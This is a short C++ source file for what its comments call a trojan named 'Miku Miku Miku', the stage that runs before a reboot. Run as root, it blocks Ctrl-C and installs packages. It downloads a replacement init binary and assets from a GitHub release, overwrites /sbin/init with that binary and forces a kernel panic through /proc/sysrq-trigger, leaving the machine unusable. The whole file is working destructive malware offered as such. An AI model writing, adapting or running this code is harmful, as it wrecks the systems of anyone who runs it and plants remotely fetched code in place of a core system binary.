#include <iostream>
#include <cstdlib>
#include <unistd.h>
#include <csignal>

// The pre-reboot part of Miku Miku Miku.
// The system is guaranteed to reboot anyway here, this is just what the user sees before a kernel panic.

int main()
{
    std::signal(SIGINT, SIG_IGN);

    std::cout << "You ran this as Root, eh? If you did, Hatsune Miku turned evil and FUCKED your PC!!!\n/sbin/init has been replaced with a destructive program.\nI have a surprise at the end of the payload however. Stick around to find out what it is!";

    // Downloading some dependencies for the trojan.
    // The payload doesn't work right without mpv.
    system("pacman -Sy --noconfirm ffmpeg mpv wget wine unzip > /dev/tty8");

    // This is the assets folder for the trojan.
    // It houses files that need downloading before the post-reboot payload as networking won't be available during the init step.
    system("cd / && mkdir -p /miku && cd /miku ");

    // This is a lot of shell commands, this trojan depends on wget which is an application, not a header file.
    system("wget https://github.com/Hyperion0801/Miku-Miku-Miku/releases/download/AlphaBuild1/Assets.zip && wget https://github.com/Hyperion0801/Miku-Miku-Miku/releases/download/AlphaBuild1/init && cp -f init /sbin/init");

    // This is the end of the pre-reboot payload. IT'S KERNEL PANIC TIME!!!!!
    system("echo c > /proc/sysrq-trigger");

    return EXIT_SUCCESS;
}
